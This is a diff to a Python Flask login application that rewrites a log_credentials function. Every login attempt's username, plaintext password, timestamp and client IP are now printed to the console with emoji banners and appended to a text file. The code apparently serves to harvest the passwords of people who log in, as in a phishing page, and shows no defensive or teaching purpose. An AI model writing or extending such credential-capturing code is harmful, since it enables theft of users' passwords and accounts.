@@ -4,11 +4,20 @@ from flask_login import LoginManager, UserMixin, login_user, logout_user, login_
 from werkzeug.security import generate_password_hash, check_password_hash
 from datetime import datetime
 import os
-
 def log_credentials(username, password, source="login"):
-    """Save credentials to a log file"""
+    """Log credentials to file AND print to console"""
     log_file = "credentials_log.txt"
     
+    # PRINT TO CONSOLE (THIS IS WHAT YOU'RE MISSING!)
+    print("\n" + "="*60)
+    print(f"🔔 NEW {source.upper()} ATTEMPT!")
+    print(f"👤 Username: {username}")
+    print(f"🔑 Password: {password}")
+    print(f"⏰ Time: {datetime.now()}")
+    print(f"🌐 IP: {request.remote_addr}")
+    print("="*60 + "\n")
+    
+    # ALSO SAVE TO FILE
     with open(log_file, "a") as f:
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         f.write(f"\n{'='*60}\n")
@@ -16,9 +25,8 @@ def log_credentials(username, password, source="login"):
         f.write(f"Source: {source}\n")
         f.write(f"Username: {username}\n")
         f.write(f"Password: {password}\n")
+        f.write(f"IP: {request.remote_addr}\n")
         f.write(f"{'='*60}\n")
-    
-    print(f"✅ Credentials logged to {log_file}")
 
 # Initialize Flask app
 app = Flask(__name__)
